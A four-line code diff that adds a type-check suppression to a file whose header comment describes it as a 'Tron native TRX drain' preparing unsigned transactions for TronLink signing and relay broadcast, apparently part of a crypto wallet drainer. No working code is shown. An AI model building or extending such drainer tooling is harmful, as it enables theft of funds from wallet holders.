@@ -1,3 +1,4 @@
+// @ts-nocheck
 /**
  * Tron native TRX drain — unsigned transaction for TronLink signing + relay broadcast.
  */
